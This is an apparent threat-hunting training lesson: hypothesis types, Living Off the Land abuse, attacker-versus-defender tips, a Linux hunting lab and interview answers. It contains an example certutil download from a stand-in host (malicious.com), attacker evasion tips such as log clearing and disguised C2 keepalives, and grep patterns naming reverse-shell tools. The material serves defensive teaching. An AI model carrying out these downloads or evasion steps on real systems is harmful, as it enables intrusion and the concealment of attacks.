Threat Hunting Fundamentals

Threat hunting is proactive detection — finding attackers before alerts fire. Today you apply the Pyramid of Pain and hypothesis-driven hunting methodology.

THEORY

What is Threat Hunting? Threat hunting is the proactive search for adversaries within an environment — assuming that attackers are already present and actively looking for signs they missed the automated detection tools. Unlike incident response (reactive) or vulnerability management (preventive), hunting starts with a hypothesis: "I believe an attacker may have used PowerShell to download a payload in the past 7 days. Let me search for evidence of that specific behavior."

The Hunting Hypothesis Framework:

Analytics-Driven
Based on data anomalies — "Unusual outbound traffic on port 445 from a workstation at 3 AM."
Intel-Driven
Based on threat intelligence — "APT29 was seen using T1133 in healthcare. Let's hunt for RDP persistence in our environment."
TTP-Driven
Based on known attacker tradecraft — "Attackers commonly use certutil.exe to decode Base64 payloads. Let's find certutil usage with decode flags."
Situational
Based on organizational context — "New Log4j CVE just dropped. Let's hunt for any system running Log4j in our environment."

Living Off the Land (LotL): Modern attackers increasingly use only native OS tools — PowerShell, WMI, certutil, mshta, bitsadmin, and schtasks — because they are signed, trusted, and rarely blocked by application whitelisting. Threat hunting specifically targets LotL abuse patterns. For example, hunting for certutil -urlcache -f http://malicious.com/payload.exe catches file downloads, and hunting for wmic process call create "cmd.exe /c ..." catches remote command execution — both using legitimate tools for malicious purposes.

# Example: Hunting hypothesis for LotL abuse Hypothesis: "An attacker may have used certutil.exe to download payloads" # Linux hunting: look for curl/wget to suspicious IPs in bash history grep -rE "curl|wget" ~/.bash_history | grep -v "google.com|github.com" # Hunting for scheduled task persistence schtasks /query /fo csv /v | findstr /i "powershell cmd.exe" # Hunting for WMI process creation (lateral movement) wevtutil qe Microsoft-Windows-WMI-Activity/Operational /c:50 /rd:true /f:text | findstr "ProcessCreation"
Why hunting is essential: A 2024 SANS survey found organizations with active threat hunting programs detect attackers 3x faster (median dwell time 14 days vs 48 days). The difference is proactive vs reactive defense. Automated tools detect known patterns; hunting detects novel patterns by applying human creativity to data analysis.
// attacker vs defender mindset
ATTACKER
  • Use only LOTL binaries that blend into normal admin activity — certutil.exe looks like IT maintenance, not malware. Avoid dropping custom binaries that EDR will flag.
  • Operate during business hours to blend into normal traffic patterns — a PowerShell beacon at 3 PM on a Tuesday is less suspicious than one at 3 AM.
  • Use living-off-the-land binaries with benign-seeming arguments — certutil -ping (a legitimate admin command) looks normal but can be used as a C2 keepalive.
  • Tamper with event logs to hide hunting evidence — wevtutil cl (clear logs) and selective event deletion remove the very data hunters rely on.
DEFENDER
  • Enable command-line logging (4688 events with command line) in Windows — without this, you can't see what certutil.exe was asked to do. This is the single most important hunting data source.
  • Create a hunting hypothesis weekly based on the latest threat intel — "I'll hunt for T1059.001 (PowerShell) and T1105 (Remote File Copy) using our EDR data."
  • Don't just look for malicious files — look for malicious behavior. A running powershell.exe isn't suspicious. A powershell.exe that downloads an encoded script from an external IP is.
  • Preserve hunting queries and results in a knowledge base so you can re-run them when new threat intel arrives — yesterday's clean results become today's baseline for anomaly detection.

HANDS-ON LAB

Goal: execute three threat hunting hypotheses against a Linux system — search for persistence, command-line abuse, and network anomalies.

  1. Hunt for SSH key persistence: find /home -name "authorized_keys" -exec cat {} \; — check for unexpected SSH keys that would allow persistent access.
  2. Hunt for crontab persistence: for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done — list all crontabs looking for suspicious scheduled tasks.
  3. Hunt for command-line abuse: cat ~/.bash_history | grep -E "curl|wget|nc|ncat|bash -i|/dev/tcp" | grep -v "google.com|github.com|apt|pip" — look for suspicious network tool usage.
  4. Hunt for unusual SUID binaries: find / -perm -4000 -type f 2>/dev/null | while read f; do echo "$(date -r $f) $f"; done — SUID binaries with recent modification dates are suspicious.
  5. Hunt for outbound connections: netstat -tunap 2>/dev/null | grep ESTABLISHED | grep -v "127.0.0.1" — look for unexpected established connections.
  6. Document each hypothesis, your search method, the results, and your conclusion (suspicious or benign).
Deliverable: a threat hunting report with 3 hypotheses, the commands used, results, and conclusions. This is the exact format threat hunters use to document their work — demonstrating you can form hypotheses and systematically test them against data.

INTERVIEW READY
Q: "What is threat hunting and how is it different from incident response?"
A: "Threat hunting is a proactive search for adversaries based on a hypothesis — you assume compromise and go looking for evidence. Incident response is reactive — you respond after a detection has fired. Hunting finds attackers that automated detection tools missed. The key difference is the trigger: incidents are triggered by alerts; hunts are triggered by hypotheses. A hunter says 'I think someone might have used certutil.exe to download files last week' and searches proactively, without an alert."
Q: "How do you form a threat hunting hypothesis?"
A: "There are four sources. Analytics-driven: based on data anomalies like unusual traffic patterns or login times. Intel-driven: based on threat intelligence — if a report says APT29 is targeting our industry with spear-phishing, I'd hunt for T1566.001. TTP-driven: based on known adversary behaviors — attackers commonly use certutil.exe to download payloads, so I hunt for that specific behavioral pattern. Situational: based on current events — a new CVE like Log4j is announced, so I hunt for vulnerable versions in the environment."
Q: "What is 'Living Off the Land' and how do you hunt for it?"
A: "Living Off the Land refers to attackers using only built-in OS tools — PowerShell, certutil.exe, wmic.exe, bitsadmin.exe — to execute malicious actions without dropping custom binaries. This evades signature-based detection. To hunt for it, I query Windows Event Log 4688 (process creation with command line) for unusual usage of LOTL binaries. For example: certutil.exe with -urlcache -f to download files, or PowerShell with -EncodedCommand to execute obfuscated scripts. The LOLBAS project catalogs over 200 binaries and their abuse patterns, which directly map to hunting queries."
